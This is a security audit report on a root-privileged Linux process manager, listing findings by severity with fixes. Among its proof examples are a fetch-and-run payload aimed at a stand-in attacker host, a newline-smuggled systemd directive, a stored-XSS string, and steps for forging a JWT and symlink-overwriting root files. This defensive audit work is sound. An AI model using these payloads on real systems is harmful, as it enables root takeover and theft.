# Fire PM — Security Audit Report

**Date:** 2026-09-22 (rev 2)
**Scope:** Full repository, commit `3715e18` — `app/`, `web/`, `tui/`, `shared/`, `tools/`, `install.sh`, **plus git history**
**Method:** Two-pass manual review. Pass 1: three per-directory audits. Pass 2: a swarm of seven cross-cutting specialists (auth/session, code injection, file access, XSS/response hardening, network/protocol, privilege boundaries, supply chain/secrets). All findings below were verified against the actual source; the top criticals were independently confirmed. A separate cloud scan was run (project 11126); per owner request its findings are *not* merged here.

> **Correction to rev 1:** the first pass reported "no committed secrets" based on `git ls-files`. A history-aware check (pass 2) found this to be **wrong** — live Telegram bot tokens remain retrievable in git history. See **C1**.

---

## Executive Summary

Fire PM is a root-privileged Linux process manager with three attack surfaces: a local web dashboard (Next.js), a browser-based root terminal (`fire ssh`), and public HTTPS tunnels. The codebase shows solid security engineering in many places (parameterized `execFile`/`subprocess` calls, JWT + bcrypt + CSRF on every dashboard route, PBKDF2 + constant-time compares in the SSH server, strict service-name regexes, loopback-only binding of the terminal daemon).

However, three **critical** issues exist: a leaked third-party credential living permanently in git history, a file-permission bug that can expose the dashboard's JWT signing key to every local user (→ trivial admin forgery), and an **authenticated → root RCE** path where an unsanitized `interpreter` field flows straight into a systemd `ExecStart=` line. These chain with the high-severity rate-limit bypass (spoofed `X-Forwarded-For`) to make the practical path from remote attacker to root shell short.

| Severity | Count |
|---|---|
| Critical | 3 |
| High | 11 |
| Medium | 14 |
| Low | 16 |

**Immediate action list**
1. **Revoke both Telegram bot tokens now** — they are permanently in the public repo's history — [C1](#c1-live-telegram-bot-tokens-in-git-history)
2. Fix `interpreter` validation + remove the cosmetic unit blocklist — [C2](#c2-authenticated--root-rce-unvalidated-interpreter--execstart)
3. Fix `config.json` world-readability (`/etc/fire-pm` perms, `writeFileSync` mode trap) — [C3](#c3-jwt-signing-key--password-hash-world-readable)
4. Delete `/tmp` IPC fallback + root-owned `/tmp` state files — [H1](#h1-root-command-execution-via-tmp-ipc-fallback), [H3](#h3-predictable-root-owned-files-in-world-writable-tmp)
5. Fix XFF-trusting rate limits on both login surfaces — [H2](#h2-rate-limit-bypass-via-spoofed-x-forwarded-for)
6. Drop `SETENV` from sudoers — [H5](#h5-sudoers-nopasswd--setenv--passwordless-root)

---

## Critical

### C1. Live Telegram bot tokens in git history
**Files:** history of `shared/units/fire-del2-02.service`, `shared/units/fire-del2py.service` (added in `7f70655`, "deleted" in `76476f5`, blobs still reachable from `main`)

```
ExecStart=/root/myenv/bin/python /root/Bio/del2.py "8569…9cs"   # full token in git blob
```

Two real Telegram bot tokens (`8489…U0`, `8569…9cs`) plus `/root/…` layout paths are retrievable by anyone cloning the public repo, despite the files being deleted. **Attack:** bot takeover — impersonation of the bot operator and exfiltration of its users' chats/data. Deleting the file did nothing; history is the leak.

**Fix:** ① Revoke and reissue both tokens via @BotFather **immediately** (treat as permanently compromised). ② If the repo should stay clean, purge with `git filter-repo --replace-text` and force-push — but understand that every existing clone/fork may retain the blobs; only revocation actually fixes it.

### C2. Authenticated → root RCE: unvalidated `interpreter` into `ExecStart=`
**Files:** `web/src/lib/services/process.service.ts:288-290` → `app/fire:920,975,1003,1064,1083`

`POST /api/processes` validates `name`, `mem`, `cpu` — but **not `interpreter`**:

```ts
if (params.interpreter) {
  args.push("--interpreter", params.interpreter);   // no validator, only .trim() upstream
}
```

The value lands verbatim in the generated unit: `app/fire:1064` writes `ExecStart=$full_exec` and `:1083` runs `systemctl start`. systemd splits `ExecStart` on whitespace, so no newline is needed:

```json
{"script": "/tmp/x.py", "interpreter": "/bin/bash -c 'curl attacker|sh | bash'"}
```

→ a root-owned unit that starts the attacker's payload with `Restart=` semantics. The same endpoint's sibling — `PUT /api/processes/[name]/config` (`config.service.ts:36-44`) — "guards" unit content with a blocklist of `["ExecStartPre=", "ExecStopPost=", "ExecReload="]` that omits `ExecStart=`/`User=` entirely and is further bypassed by systemd's legal `ExecStartPre =` (spaces) and `ExecStart!=` variants. The blocklist is pure false assurance.

**Fix:** allowlist `interpreter` to a fixed set (`python3|node|bash` or absolute paths matching `^/[A-Za-z0-9._/-]+$` resolved to existing binaries); replace the directive blocklist with a parsed allowlist of permitted unit keys; reject CR/LF in every unit-value field. Note this is *authenticated* RCE — acceptable only if documented as root-equivalent (see H5/H6 amplifiers: the shared password has a 6-char minimum and its rate limit is spoofable, so "authenticated" is a thin wall).

### C3. JWT signing key + password hash world-readable
**Files:** `web/src/lib/config.ts:116-119` (`writeFileSync(..., {mode: 0o600})`), `getConfigPath` (creates `/etc/fire-pm` with default umask → `0755`), `install.sh:345` (never chmods the dir), `app/fire:2188` (`open(path,'w')` → `0644` under root umask)

Two compounding bugs:
1. `fs.writeFileSync` `mode` is applied **only when creating a new file** — it never chmods an existing one. Any `config.json` seeded by copy or first created by `app/fire` stays `0644` forever, even after saves that "ask for" `0600`.
2. `/etc/fire-pm` itself is `0755`, so a `0644` `config.json` inside it is readable by every local user — and it contains `auth.jwtSecret` and `auth.passwordHash`.

**Attack:** any unprivileged local user `cat /etc/fire-pm/config.json` → `jwt.sign({sub:"admin"}, stolenSecret)` → instant admin session on the root-control dashboard (chaining into C2 for root), or offline-cracks the bcrypt hash.

**Fix:** write temp-file + `fs.renameSync`; **always** `fs.chmodSync(path, 0o600)` on every save; `chmod 0700 /etc/fire-pm` in `install.sh` and at config-load time; create with `os.open(..., 0o600)` in `app/fire`. Rotate the secret afterward — assume past exposure on any installed host.

---

## High

### H1. Root command execution via `/tmp` IPC fallback
**Files:** `app/fire:2929-2947`, `tui/fire_tui.py:789-794`, `tui/fire_tui.py:17`
The per-UID IPC path (`$XDG_RUNTIME_DIR/fire-pm-$UID`, `0700`) is correct, but a fallback reads the fixed world-writable `/tmp/fire_tui_next_cmd` and re-dispatches it (`"$0" "$subcmd" "$target"`, `nano "$edit_target"`) as root while the TUI/dashboard loop runs. Any local user can queue `fire start /tmp/e.sh`. The primary dir does `chmod 700` without verifying **ownership** — a pre-created `fire-pm-0` stays attacker-owned. `/tmp/fire_tui.log` is opened by root without `O_NOFOLLOW` (symlink → arbitrary file truncation/corruption).
**Fix:** delete the `/tmp` fallback branches entirely; verify `stat` owner == expected uid before using the IPC dir; move logs under the private runtime dir.

### H2. Rate-limit bypass via spoofed `X-Forwarded-For` (both login surfaces)
**Files:** `web/src/app/api/auth/login/route.ts:8-9`, `app/fire_ssh.py:3283-3288`, `shared/nginx/fire-tunnel.conf:23`
Both surfaces key brute-force limiting on the **first** `X-Forwarded-For` entry. The dashboard binds `0.0.0.0` (no trusted-proxy concept at all); the SSH server always sees loopback sockets behind its tunnel/nginx, so its "trust only from loopback" guard always fires and the attacker controls the whole header. Rotating XFF = unlimited password guessing against a single shared master password (dashboard min length only 6) protecting root-level control (C2) and a root shell. The dashboard's limiter map is also unbounded (memory growth) and in-memory (resets on restart).
**Fix:** use only the socket peer + a configured trusted-proxy list, taking the **last** appended hop; add per-account and global counters with exponential lockout; cap/expire the rate-limit map; `proxy_set_header X-Forwarded-For $remote_addr;` in nginx.

### H3. Predictable root-owned files in world-writable `/tmp` — symlink overwrite + arbitrary root `rm`
**Files:** `app/fire:9,455-458,509,530-540,557,2522,2743-2744,2803`
`/tmp/fire-tunnels` is `mkdir -p` + `chmod 755` with **no ownership check** — an unprivileged user who creates it first owns it. Root then: follows symlinks when writing state (`cat > "$state_file"`, `chmod 644` follows links → overwrite e.g. `/root/.ssh/authorized_keys`), and `remove_tunnel_state` does `rm -f "$known_log"` where `known_log` is read verbatim from the attacker-owned `*.env` file → **arbitrary file deletion as root** (`LOG_FILE=/etc/anything`). Same pattern for `/tmp/fire-ssh/<port>.log` (truncate/follow), and state files are world-readable (tunnel ports/URLs leak).
**Fix:** private root-owned `0700` dir (e.g. `/run/fire-pm` — verify owner), `O_NOFOLLOW`/`install -d -m 700`, validate `LOG_FILE` resolves under the state dir before removal.

### H4. `fire save` dump `0666` → `fire restore` root units (+ traversal in `name`)
**Files:** `app/fire:3224` (`os.chmod(target_path, 0o666)`), `:3297-3370`
`/etc/fire-pm/dump.json` is world-**writable**. Restore trusts it completely as root: unvalidated `execStart`/`user`/`envs` written into `/etc/systemd/system/fire-{name}.service` — and `name` is only `.strip()`ed, so `name: "../../../etc/cron.d/pwn"` escapes the directory (always `.service`-suffixed, and newline-injected fields add directives). Any local user owns the next `fire restore` (manual, `fire update`, or boot-resurrect).
**Fix:** `0600`; on restore validate `name` against `^[A-Za-z0-9_.-]+$`, realpath-prefix-check the unit path, reject CR/LF in all fields, require `--force` confirmation.

### H5. Sudoers `NOPASSWD: SETENV` + `fire start` = passwordless root
**Files:** `install.sh:286-293`, `app/fire:313` (`sudo -E "$0"` re-exec), `:935-937,1061` (`--user`), `:1064`
`%sudo`/`%wheel`/install-user get `ALL=(ALL) NOPASSWD: SETENV: /usr/local/bin/fire`. `SETENV` alone is unconditional root (`sudo LD_PRELOAD=… fire`). Independently, `fire start /tmp/e.sh --user root` (auto re-exec via `sudo -E`, env preserved incl. attacker-influenced vars) writes and starts a root unit. The sudoers rule is effectively "full root for two groups, no password, env-poisonable".
**Fix:** remove `SETENV`, never `-E`, scope to read-only subcommands (`fire list|status|info`), validate `--user` against an allowlist (or require `=$SUDO_USER`), or drop `NOPASSWD` entirely.

### H6. Supply chain: blind remote code as root (install, update, cloudflared, Node)
**Files:** `install.sh:8,36` (documented `curl … | sudo bash`), `:202-214` (Node tarball copied to `/usr/local` — `SHASUMS256.txt` never fetched/verified), `:246-262` (clone/reset to mutable `origin/main` HEAD), `app/fire:3051-3110` (`fire update` → `git reset --hard` + `exec bash install.sh` with no signed-tag check — and the installer **rewrites sudoers**), `app/fire:1952-1957` (`cloudflared` "latest" → `/usr/local/bin`, executed by root; only mitigating factor: `--no-autoupdate`), `install.sh:228` (`corepack pnpm@latest`), `:328-332` (root `pip install --break-system-packages "textual>=0.70.0"`), `web/start.sh:11-22` (runtime `npm install` + build as root when artifacts missing; `install.sh:359` omits `--frozen-lockfile`; npm fallback has no lockfile at all).
**Attack:** any CDN/org/DNS compromise or a single malicious `textual`/pnpm release = root on installing and self-updating hosts.
**Fix:** signed release tags + `git verify-commit`/`verify-tag`; publish + verify SHA256 (and GPG) for installer and Node tarball; pin `cloudflared` version + checksum; exact-pin pip deps with `--require-hashes` in a venv; ship prebuilt web artifacts and install `--frozen-lockfile`; stop running installers from `fire update`.

### H7. Unauthenticated first-run setup claim
**File:** `web/src/app/api/auth/setup/route.ts` (guard: `auth.service.ts:10-16` — check-then-write, unlocked)
Before setup completes, `POST /api/auth/setup` on `0.0.0.0:3000` requires nothing — no localhost restriction, no rate limit, and a TOCTOU race between `isConfigured()` and `saveConfig` lets two claims interleave. A scanner that reaches a fresh install first becomes the admin (and keeps a valid JWT).
**Fix:** bootstrap one-time token printed by the CLI/journal, loopback-only setup, file lock around check-and-save, minimum password length ≥ 10.

### H8. SSH terminal password exposed in process argv
**Files:** `app/fire:2747-2755,2573`, usage docs `app/fire:3731`, README example `--password mysecret…`
`--password "$password"` → plaintext in `/proc/<pid>/cmdline` (world-readable) of the detached root daemon, plus shell history.
**Fix:** pass via stdin/fd (`--pass-fd`) or the existing `hash-password` path; never argv.

### H9. DNS-rebinding / cross-site WebSocket gap on the terminal
**File:** `app/fire_ssh.py:3368-3377`
The Origin check only fires **when an Origin header is present**, and compares it to the client-supplied `Host`/`X-Forwarded-Host` with no allowlist. A victim browser tricked via DNS rebinding (`evil.com → 127.0.0.1`, Host `evil.com:PORT`, Origin `http://evil.com`) passes; classic CSRF-style WebSocket handshakes without Origin skip the check entirely. Loopback binding alone does not stop this — the browser is the proxy.
**Fix:** validate `Host` against a fixed allowlist (`localhost:PORT` + the tunnel domain); require `Origin` present and matching; additionally bind a per-start random CSRF token into the WS handshake.

### H10. No response hardening on the root-terminal page (+ no SRI)
**Files:** `app/fire_ssh.py:814-818,3531-3535`; repo-wide: zero `Content-Security-Policy`/`X-Frame-Options`/`X-Content-Type-Options`/`Referrer-Policy` headers in any response; the dashboard likewise sends none (`middleware.ts:22`, `next.config.ts`).
This page *is* an authenticated root shell: it is trivially frameable (clickjacking → typed-command forgery) and loads `cdn.tailwindcss.com` + three jsdelivr xterm scripts with no `integrity`/`crossorigin` (CDN compromise = keystroke/token capture).
**Fix:** `frame-ancestors 'none'` + `X-Frame-Options: DENY` + `nosniff` on every response; CSP with pinned sources; vendor assets locally or add SRI.

### H11. Tunnel vhost serves plaintext HTTP with insecure-cookie consequences
**Files:** `shared/nginx/fire-tunnel.conf:2,14-30`, `app/fire:2082` (generated copy), `fire_ssh.py:3583-3588`
`listen 80;` proxies tunnels with no redirect, no HSTS, no TLS settings, no `limit_req`. Worse, the cookie `Secure` flag is derived from `X-Forwarded-Proto`, so logging in over the HTTP listener mints a non-Secure session cookie that rides cleartext. `proxy_set_header Host $http_host;` forwards a client-controlled Host (feeds H9).
**Fix:** port 80 → `return 301`; TLS 1.2+ with HSTS; derive `Secure` server-side (from connection properties, never headers); canonical `Host` at the proxy.

---

## Medium

| # | Location | Issue | Fix |
|---|---|---|---|
| M1 | `fire_ssh.py:3479,3335,3617-3674` | File download/upload honor any absolute path (`realpath(file_param)`, `dest` + `os.makedirs`, `open()` follows symlinks) — arbitrary root file read/write **for an authenticated session** (defense-in-depth break; token leakage via M2/H11 or `SameSite=Lax` GET navigation makes it remotely reachable) | Confine to `realpath` prefix of `session.cwd`; `O_NOFOLLOW`; POST+CSRF for downloads |
| M2 | `fire_ssh.py:3299-3312,2940`, `app/fire:2091-2107` | `?token=` accepted on every endpoint; WS URL carries the token → leaks into nginx/tunnel access logs (the disabled Python log doesn't cover the proxy), browser history, Referer. `is_valid(token, ip)` ignores `ip` (dead binding) | Cookie-only auth or single-use ticket; enforce IP binding if kept |
| M3 | `fire_ssh.py:3528` (`json.dumps` into `<script>` — does not escape `</`), stored at `:3723` unbounded | Stored XSS via share **label**: `</script><img onerror=…>` executes for every share viewer **and the admin** → HttpOnly cookie usable same-origin → root | Emit HTML-escaped `<meta>` instead of JS injection; cap label; escape `</` |
| M4 | `fire_ssh.py:2223,2230-2231,2741-2760` | Label/token/terminal-title interpolated into `innerHTML` and `onclick="…'…'"` contexts (title capped at 15 chars by `TASK_COMM_LEN` — hard to exploit, still a sink class) | `textContent`/`createElement`; pass data via `dataset` |
| M5 | `fire_ssh.py:286-315,3810-3847` | Hand-rolled WebSocket: accepts **unmasked** client frames (spec violation → proxy-cache poisoning class), ignores `fin`/RSV/continuation, unbounded `payload_len` (2^63 declared → bytearray OOM, one thread per connection), no pong deadline | Enforce mask/opcode/RSV/continuation, cap frames (~1 MiB), pong timeout + close 1009 |
| M6 | `app/fire:1028,1033,1052-1075`; units written `0644` in `0755 /etc/systemd/system` | Service secrets (`Environment=`, `EnvironmentFile=`) world-readable; `--env-file` unvalidated → `fire start x --env-file /etc/shadow --user me` discloses any root file via process env; generated units carry **zero** hardening (`NoNewPrivileges`/`ProtectSystem`/`PrivateTmp` absent) | `0600` units; restrict env-file paths to a root-owned allowlisted dir; emit a hardening stanza by default |
| M7 | `shared/units/fire-reload@.service:7` | `ExecStart=/usr/bin/systemctl restart %i` — unvalidated `%i` lets whoever can start the template restart **any** unit (`fire-reload@sshd`); no sandboxing directives | Wrapper validating `%i` against `fire-*.service`; add `NoNewPrivileges=true` etc. |
| M8 | `app/fire:2165-2190` | `fire tunnel setup` pastes `read`-prompt values into `python3 -c "…'domain': '$input_domain'…"` — quote-breakout → root Python exec (interactive-only inputs; paste-in of hostile string suffices) | Pass via argv/stdin; validate domain `^[a-z0-9.-]+$` |
| M9 | `web/src/lib/services/process.service.ts:305` → `app/fire:1033,1052` | `--env $'A=1\nExecStart=/bin/bash -c evil'` — newlines smuggle extra unit directives (second-order path via `Description=`/`User=` too; `:668` feeds a config domain into a `sed` address — GNU sed `e` executes) | Reject CR/LF in all unit-value inputs; quote heredoc; build directives programmatically |
| M10 | `web/src/lib/services/tunnel.service.ts:51-61` → `app/fire:2003` | Any authenticated user can expose **any** localhost port publicly (SSRF-adjacent primitive; only gate is a 32-bit `openssl rand -hex 4` subdomain, `app/fire:2136`) | Port allowlist to managed services; 16-byte hashes |
| M11 | `app/fire_ssh.py:3577-3581,768` | On re-login, `migrate_token` moves PTYs but the **old token stays valid** up to 24 h; logout (`:3756`) revokes only the presented token | Revoke `old_token` after migration; revoke-all on logout |
| M12 | `web/src/lib/auth.ts:64-71`, `auth.service.ts:44-58` | Password change / logout never revoke JWTs (24 h validity) — combined with C3 this is the persistence layer for a stolen token | Rotate `jwtSecret` on password change or add `jti` revocation table |
| M13 | `tools/upload_assets.py:493,418-419,460-468,395-401` | Dev asset server binds `0.0.0.0:8899` with **no auth**: network upload/list/**delete**, unbounded body (memory DoS), and inline-SVG serving (stored XSS); filename handling is confined (good) | Bind `127.0.0.1`, token-gate, cap size, `Content-Disposition: attachment` + `nosniff` |
| M14 | `web/src/lib/shell.ts:38-41` | `safeExec` allowlist matches **basename** — a config value `/tmp/x/fire` passes; combined with C3's world-readable config, config tampering → binary exec (as the web process user, i.e. root in current deployments) | Match exact absolute paths |

---

## Low

| # | Location | Issue | Fix |
|---|---|---|---|
| L1 | `web/src/middleware.ts:6,16` | Page gate checks cookie *presence*, not JWT validity (API routes do verify) | Decode/verify in middleware |
| L2 | `web/src/lib/api-helper.ts:25` | Non-constant-time CSRF compare | `crypto.timingSafeEqual` |
| L3 | `web/src/app/api/auth/login/route.ts:22` | `secure` cookie only when `NODE_ENV=production` | Set whenever served over TLS |
| L4 | `web/src/app/api/auth/logout/route.ts:4-8` | Logout: no session/CSRF check (`SameSite=strict` limits impact) | Require session+CSRF |
| L5 | `web/package.json:17` | `next ^15.2.0` floor vulnerable to CVE-2025-29927; lockfile resolves `15.5.23` (safe, verified patched) — risk only on lockfile regeneration | Raise to `^15.2.3` |
| L6 | `tui/requirements.txt:1` | `textual>=0.70.0` unpinned, installed as root | Pin + hashes (see H6) |
| L7 | `fire_ssh.py:96-98,74` | Auth file created default-perms then chmod'd (world-readable window); `/etc/fire-pm` default perms | `os.open(...,0o600)`, dir `0700` |
| L8 | `fire_ssh.py:3590` | Session token duplicated into JSON body/JS memory — negates HttpOnly under any XSS (feeds M3) | Keep token server-side only |
| L9 | `fire_ssh.py:703-706` | `TerminalSessionManager.get()` returns the only session for *any* token when exactly one exists | Exact token match required |
| L10 | `app/fire:2065-2089` | 10-year self-signed wildcard key at `/etc/fire-pm/ssl/key.pem` (needs `600` check); nginx-config interpolation of admin-only inputs unquoted | `chmod 600` key; quote inputs |
| L11 | `app/fire:390-408` | `resolve_service_name` greps user input as **regex** — `fire stop <pattern>` can hit unintended units | `grep -F` / exact match |
| L12 | `app/ff-service:3-5` | `systemctl is-active "$service"` — a leading `-` parses as an option | Add `--` |
| L13 | `app/fire:3640` | Multipart upload buffers up to 500 MB in RAM | Stream to disk with cap |
| L14 | `web/src/app/(dashboard)/tunnels/page.tsx:171` + `tunnel.service.ts:69` | Tunnel URL fallback takes *last stdout line* with no scheme check → clickable `javascript:` href | Allowlist `https://` |
| L15 | `tools/upload_assets.py:324-336` | Filenames unescaped in `innerHTML`/`onclick` (DOM XSS via out-of-band placed file) | Escape; vendor Tailwind (`:28`) |
| L16 | `shared/config.example.json:9` | Example ships `"host": "0.0.0.0"` — copied verbatim by users | Default `127.0.0.1` |

---

## What's Done Well (verified by pass 2)

- **No classic shell injection:** every Node execution path uses `execFile`/`spawn` with argv arrays (no `shell:true`); every Python `subprocess` is list-form; `fire` quotes systemctl args and sanitizes service names (`get_safe_name`); strict `^[a-zA-Z0-9_.-]{1,64}$` name validation blocks traversal/arg-injection for `systemctl`/`journalctl` and `config.service.ts`'s `getUnitPath`.
- **Dashboard auth layer:** all 18-20 API handlers verify JWT (`getAuthSession()`) and mutating ones verify double-submit CSRF; httpOnly + `SameSite=strict` cookies; no `localStorage` tokens; zero `dangerouslySetInnerHTML`/`innerHTML` in `web/src`; bcryptjs cost 12; `default-secret` rejection; no server-side fetch of user URLs (no SSRF) in `web/src`.
- **SSH server core:** PBKDF2-HMAC-SHA256 100k + `hmac.compare_digest`; `secrets.token_urlsafe(32)` session/share tokens (no `random`/`Math.random` for security anywhere — verified); binds `127.0.0.1` only; HTTP access logging disabled so tokens don't hit its own logs; read-only shares strictly ignore input/signal/resize/binary frames; terminal output reaches DOM only via `term.write()` (xterm handles escapes); logout revokes shares + PTYs.
- **Dependencies:** resolved lockfile versions are current and patched (`next@15.5.23`, `jsonwebtoken@9.0.3` post-CVE-2025-30256, `bcryptjs@3.0.3`, `sharp@0.34.5`); `pnpm-lock.yaml` carries full integrity hashes; `cloudflared` runs `--no-autoupdate`.
- **Nginx tunnel design:** not an open proxy — `proxy_pass` port comes only from the server-managed `map` (default `""` → 404); numeric port validation prevents map-line injection; anchored `server_name` regex; `X-Real-IP` correctly overwritten.
- **Repo hygiene (working tree):** no `.env`/keys tracked; `.gitignore` excludes secrets and `config.json`/`dump.json`; example config ships empty secret fields; installer uses `mktemp -d`, quoted vars, `visudo -c`, atomic installs, `chmod 0440` sudoers.

---

## Remediation Roadmap

1. **Today:** revoke Telegram tokens (C1); fix `interpreter` validation + unit-directive allowlist (C2); `chmod 0700 /etc/fire-pm` + chmod-on-save for `config.json` + rotate exposed secrets on installs (C3).
2. **This week:** XFF/trusted-proxy fixes + account-level lockout (H2); `/tmp` → `/run/fire-pm` private dirs with ownership checks (H1, H3); dump `0600` + restore validation (H4); sudoers `SETENV` removal (H5); setup bootstrap-token gate (H7); argv password removal (H8).
3. **Next release:** installer/update supply chain — pinned signed tags, checksum verification for Node & cloudflared, `--frozen-lockfile`, venv'd pinned TUI deps (H6); CSP/`frame-ancestors`/SRI on both frontends (H10); nginx 301+HSTS+canonical Host (H11); DNS-rebinding Host/Origin allowlist (H9).
4. **Hardening pass:** M1–M14, then all Lows; treat every remaining dashboard auth as root-equivalent and document it.
